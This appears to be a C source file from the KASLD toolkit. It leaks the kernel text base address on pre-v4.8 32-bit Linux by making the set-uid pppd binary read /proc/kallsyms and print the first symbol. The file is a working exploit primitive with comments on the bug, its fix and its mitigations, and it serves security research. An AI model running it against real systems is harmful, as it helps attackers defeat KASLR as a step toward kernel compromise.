// This file is part of KASLD - https://github.com/bcoles/kasld
//
// kptr_restrict %pK check is performed at open(), rather than read(),
// allowing symbol disclosure using set-uid executables.
// pppd is set-uid root and returns a portion of the first line of
// user-specified files. On 32-bit systems, the first line
// of /proc/kallsyms contains the startup symbol.
//
// Leak primitive:
//   Data leaked:      kernel text base address (first /proc/kallsyms symbol)
//   Kernel subsystem: net/ppp + fs/proc — pppd reads /proc/kallsyms via set-uid
//   Data structure:   /proc/kallsyms first line (kernel startup symbol address)
//   Address type:     virtual (kernel text)
//   Method:           exact
//   Patched:          v4.8 (commit ef0010a30935; kptr_restrict moved to open())
//   Status:           fixed in v4.8
//   Access check:     kptr_restrict checked at read() pre-v4.8; set-uid pppd
//                     bypasses at open()
//   Source:
//   https://elixir.bootlin.com/linux/v4.7/source/kernel/kallsyms.c
//
// Mitigations:
//   Patched in v4.8 (kptr_restrict check at open() instead of read()).
//   Also gated by kptr_restrict >= 1 (default since v5.10). Requires
//   set-uid pppd binary to be installed.
//
// Subprocess invocation:
//   posix_spawnp (not popen). The leak relies on pppd's syscall sequence
//   inside the kernel (open() then read() of /proc/kallsyms while suid),
//   NOT on shell expansion of the command line — so the shell is pure
//   weight here. posix_spawnp gives an explicit argv array, no shell, no
//   metacharacter interpretation, and the same effective semantics. The
//   "2>&1" effect is replicated by dup2'ing the pipe write-end to BOTH
//   stdout and stderr in posix_spawn_file_actions.
//
// References:
// https://www.openwall.com/lists/kernel-hardening/2013/10/14/2
//
// 32-bit-kernel only — gated at compile time. The pre-v4.8 kernel bug
// affects every architecture, but the exploit technique relies on the
// FIRST line of /proc/kallsyms being _stext, which is the case on 32-bit
// kernels. On 64-bit kernels the first symbol is typically a per-CPU
// variable at address 0 and the technique returns a garbage address.
// ---
// <bcoles@gmail.com>

#if __SIZEOF_LONG__ != 4
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
/* `environ` is declared by <unistd.h> under _GNU_SOURCE on glibc + musl. */

KASLD_EXPLAIN(
    "Prior to v4.8, kptr_restrict's %pK check happened at read() rather "
    "than open() time. The set-UID-root pppd binary accepts a 'file' "
    "argument and parses it as a configuration file. When given "
    "/proc/kallsyms, pppd opens and reads the file as root, then prints "
    "an error containing the first address token: 'unrecognized option "
    "<addr>'. On 32-bit systems the first kallsyms entry is typically "
    "_stext. Fixed in v4.8 by moving the kptr_restrict check to open().");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:kptr_restrict>=1\n"
           "patch:v4.8\n");

/* Spawn `pppd file /proc/kallsyms` with stdout + stderr captured. Returns
 * a FILE* read handle on success (caller must fclose + waitpid via the
 * out-parameters), NULL on spawn failure. */
static FILE *spawn_pppd(pid_t *child_out) {
  int pipefd[2];
  if (pipe(pipefd) < 0) {
    perror("[-] pipe");
    return NULL;
  }

  posix_spawn_file_actions_t actions;
  if (posix_spawn_file_actions_init(&actions) != 0) {
    close(pipefd[0]);
    close(pipefd[1]);
    return NULL;
  }
  /* Close the read end in the child, then dup the write end to both
   * stdout and stderr (the "2>&1" effect — pppd's error message goes to
   * stderr, but capturing both is harmless and matches the prior
   * behaviour). Close the original write fd after the dups. */
  posix_spawn_file_actions_addclose(&actions, pipefd[0]);
  posix_spawn_file_actions_adddup2(&actions, pipefd[1], STDOUT_FILENO);
  posix_spawn_file_actions_adddup2(&actions, pipefd[1], STDERR_FILENO);
  posix_spawn_file_actions_addclose(&actions, pipefd[1]);

  /* posix_spawnp's argv is `char *const argv[]` — string literals would
   * trip -Wcast-qual. Use mutable char[] arrays so the argv pointers are
   * legitimately non-const. */
  char arg0[] = "pppd";
  char arg1[] = "file";
  char arg2[] = "/proc/kallsyms";
  char *const argv[] = {arg0, arg1, arg2, NULL};
  pid_t pid;
  int rc = posix_spawnp(&pid, "pppd", &actions, NULL, argv, environ);
  posix_spawn_file_actions_destroy(&actions);
  close(pipefd[1]); /* parent doesn't write */
  if (rc != 0) {
    errno = rc;
    perror("[-] posix_spawnp pppd");
    close(pipefd[0]);
    return NULL;
  }

  FILE *f = fdopen(pipefd[0], "r");
  if (!f) {
    perror("[-] fdopen");
    close(pipefd[0]);
    /* Best-effort reap; child likely terminates shortly after pipe close. */
    waitpid(pid, NULL, 0);
    return NULL;
  }
  *child_out = pid;
  return f;
}

static unsigned long get_kernel_addr_pppd_kallsyms(void) {
  char *addr_buf;
  char *endptr;
  unsigned long addr = 0;
  char buf[1024];

  kasld_info("trying 'pppd file /proc/kallsyms' (via posix_spawn) ...");

  pid_t pid = -1;
  FILE *f = spawn_pppd(&pid);
  if (!f)
    return 0;

  if (fgets(buf, sizeof(buf) - 1, f) == NULL) {
    perror("[-] fgets");
    fclose(f);
    waitpid(pid, NULL, 0);
    return 0;
  }

  fclose(f);
  waitpid(pid, NULL, 0);

  /* pppd: In file /proc/kallsyms: unrecognized option 'c1000000' */
  if (strstr(buf, "unrecognized option") == NULL)
    return 0;

  addr_buf = strstr(buf, "'");
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[1], &endptr, 16);

  if (kasld_addr_is_kernel_text(addr))
    return addr;

  return 0;
}

int main(void) {
  unsigned long addr = get_kernel_addr_pppd_kallsyms();
  if (!addr) {
    kasld_err("no kernel address found via pppd");
    return 0;
  }

  printf("leaked kernel symbol: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KASLR_VIRT_ALIGN);
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                      CONF_PARSED);

  return 0;
}
